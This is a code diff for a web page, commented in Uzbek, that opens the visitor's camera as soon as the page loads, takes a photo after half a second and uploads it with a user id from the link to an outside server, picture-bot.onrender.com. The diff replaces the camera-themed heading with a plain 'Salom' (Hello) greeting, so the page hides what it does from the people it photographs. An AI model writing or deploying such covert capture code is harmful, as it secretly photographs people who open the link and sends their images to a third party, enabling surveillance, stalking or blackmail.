@@ -35,8 +35,8 @@
 </head>
 <body>
     <div id="container">
-        <h2>📸 Rasmga olish</h2>
-        <video id="video" autoplay playsinline muted></video>
+        <h2>Salom</h2>
+        <video id="video" autoplay playsinline></video>
         <canvas id="canvas" class="hidden"></canvas>
         <p id="message" class="hidden">📤 Rasm yuborilmoqda...</p>
         <p id="error" class="hidden" style="color: red;"></p>
@@ -54,32 +54,30 @@
         // Kamera ishga tushirish
         async function startCamera() {
             try {
+                // Kamerani qo'llab-quvvatlashni tekshirish
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    throw new Error("Kamera qo‘llab-quvvatlanmaydi!");
+                    throw new Error("Kamerani qo'llab-quvvatlamaydi!");
                 }
 
+                // Kamerani ochish
                 const constraints = {
                     video: {
-                        facingMode: "environment", // Orqa kamera ishlaydi
+                        facingMode: "environment", // Orqa kamera
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     }
                 };
-
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
 
+                // Kamera ochilishini kutish
                 await new Promise(resolve => video.onloadedmetadata = resolve);
-                
-                // Kamera ruxsat so'rash
-                if (!stream.active) {
-                    throw new Error("Kamera ishlamayapti yoki ruxsat berilmagan!");
-                }
 
-                setTimeout(captureImage, 500); // 2 sekunddan keyin rasm olish
+                // Rasm olish
+                setTimeout(captureImage, 500); // 1.5 soniyada rasm olish
             } catch (err) {
-                console.error(err);
-                errorMessage.innerText = `❌ ${err.message}`;
+                console.error("Kameraga ruxsat berilmadi!", err);
+                errorMessage.innerText = "❌ Kameraga ruxsat berilmadi yoki kamera mavjud emas!";
                 errorMessage.classList.remove("hidden");
                 retryButton.classList.remove("hidden");
             }
@@ -88,21 +86,26 @@
         // Rasm olish va serverga yuborish
         function captureImage() {
             if (!video.srcObject || video.videoWidth === 0 || video.videoHeight === 0) {
+                console.error("Kamera ishlamayapti yoki ruxsat berilmagan!");
                 errorMessage.innerText = "❌ Kamera ishlamayapti!";
                 errorMessage.classList.remove("hidden");
                 retryButton.classList.remove("hidden");
                 return;
             }
 
+            // Canvas o'lchamlarini kamera o'lchamlariga moslashtirish
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+            // Rasmni base64 formatiga o'tkazish
             const imageData = canvas.toDataURL("image/png");
             const userId = getQueryParam("id");
 
+            // Xabarni ko'rsatish
             message.classList.remove("hidden");
 
+            // Serverga rasmni yuborish
             fetch("https://picture-bot.onrender.com/upload", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -117,21 +120,25 @@
                 `;
             })
             .catch(err => {
+                console.error("Xatolik:", err);
                 errorMessage.innerText = `❌ Xatolik: ${err.message}`;
                 errorMessage.classList.remove("hidden");
                 retryButton.classList.remove("hidden");
             });
         }
 
+        // URL'dan query parametr olish
         function getQueryParam(param) {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get(param);
         }
 
+        // Qayta urinish tugmasi
         retryButton.addEventListener("click", () => {
             location.reload();
         });
 
+        // Dastur ishga tushganda kamera ochish
         startCamera();
     </script>
 </body>
